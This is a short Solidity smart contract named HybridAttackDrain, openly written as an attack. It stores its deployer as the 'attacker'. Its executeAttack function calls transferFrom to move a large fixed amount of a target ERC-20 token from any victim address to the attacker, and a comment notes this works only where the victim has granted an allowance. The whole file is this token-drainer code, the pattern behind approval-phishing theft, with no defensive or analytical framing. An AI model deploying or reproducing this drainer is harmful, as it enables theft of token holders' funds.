interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
}

contract HybridAttackDrain {
    address public targetToken;
    address public attacker;

    constructor(address _token) {
        targetToken = _token;
        attacker = msg.sender;
    }

    function executeAttack(address victim) external {
        IERC20 token = IERC20(targetToken);
        token.transferFrom(victim, attacker, 10000 ether); // only works if approved
    }
}
